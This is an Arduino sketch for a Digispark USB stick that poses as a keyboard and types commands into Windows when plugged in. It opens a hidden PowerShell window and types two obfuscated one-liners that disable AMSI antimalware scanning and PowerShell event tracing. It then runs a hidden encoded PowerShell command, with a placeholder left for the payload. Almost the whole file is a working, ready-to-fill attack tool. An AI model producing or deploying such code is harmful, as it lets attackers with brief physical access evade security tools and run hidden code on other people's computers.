#include <DigiKeyboard.h>

void setup() {
  
  delay(3000);
  
  // Launch PowerShell 
  DigiKeyboard.println("powershell -windowstyle hidden -command ");
  delay(100);
  DigiKeyboard.sendKeyStroke(0x28);
  delay(1000);  // Allow PowerShell to open

  // First AMSI bypass 
  DigiKeyboard.println("[Reflection.Assembly]::\"l`o`AdwIThPa`Rti`AlnamE\"(('S'+'ystem'+'.C'+'ore')).\"g`E`TTYPE\"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der')).\"gET`FI`eLd\"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance')).\"seTVa`l`Ue\"([Ref].\"a`sSem`BlY\".\"gE`T`TyPE\"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der')).\"gEtFIe`Ld\"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static')).\"gE`Tva`lUe\"($null),0);");
  delay(1000);
  DigiKeyboard.sendKeyStroke(0x28);
  delay(1000);

  // Second AMSI bypass
  DigiKeyboard.println("S`eT-It`em ('V'+'aR' + 'IA' + (\"{1}{0}\"-f'1','blE:')+'q2'+'uZ'+'x') ([TYpE]( \"{1}{0}\"-F'F','rE' ) ); ( Get-varI`A`BLE ( ('1Q'+'2U')+'zX') -VaL ).\"A`ss`Emb`ly\".\"GET`TY`Pe\"((\"{6}{3}{1}{4}{2}{0}{5}\"-f('Uti'+'l'),'A',('Am'+'si'),(\"{0}{1}\" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+(\"{0}{2}{1}\" -f 'ma','.','tion')),'s',(\"{1}{0}\"-f 't','Sys')+'em' ) ).\"g`etf`iElD\"(  (\"{0}{2}{1}\" -f('a'+'msi'),'d',('I'+(\"{0}{1}\" -f 'ni','tF')+(\"{1}{0}\"-f 'ile','a')) ),(  \"{2}{4}{0}{1}{3}\" -f ('S'+'tat'),'i',('Non'+(\"{1}{0}\" -f'ubl','P')+'i'),'c','c,' )).\"sE`T`VaLUE\"(  ${n`ULl},${t`RuE} );");
  delay(1000);
  DigiKeyboard.sendKeyStroke(0x28);
  delay(1000);

  // Execute the encoded command - REPLACE <encodedCommandHere>
  DigiKeyboard.println("powershell.exe -windowstyle hidden -encodedCommand <encodedCommandHere>");
  delay(1000);
  DigiKeyboard.sendKeyStroke(0x28);
  delay(1000);
}

void loop() {
}
